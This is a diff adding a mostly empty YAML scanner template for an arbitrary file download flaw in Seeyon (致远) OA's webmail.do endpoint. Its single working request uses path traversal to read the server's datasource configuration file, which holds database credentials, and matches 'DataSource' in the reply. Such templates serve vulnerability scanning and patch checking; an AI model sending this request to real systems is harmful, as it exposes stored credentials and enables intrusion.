@@ -1,0 +1,19 @@
+id:
+
+info:
+  name: 致远OA webmail.do 任意文件下载
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: GET
+  path: /seeyon/webmail.do?method=doDownloadAtt&filename=test.txt&filePath=../conf/datasourceCtp.properties
+  headers:
+  data:
+response1:
+  headers:
+  body: DataSource
+  code:
+requests2:
+response2:
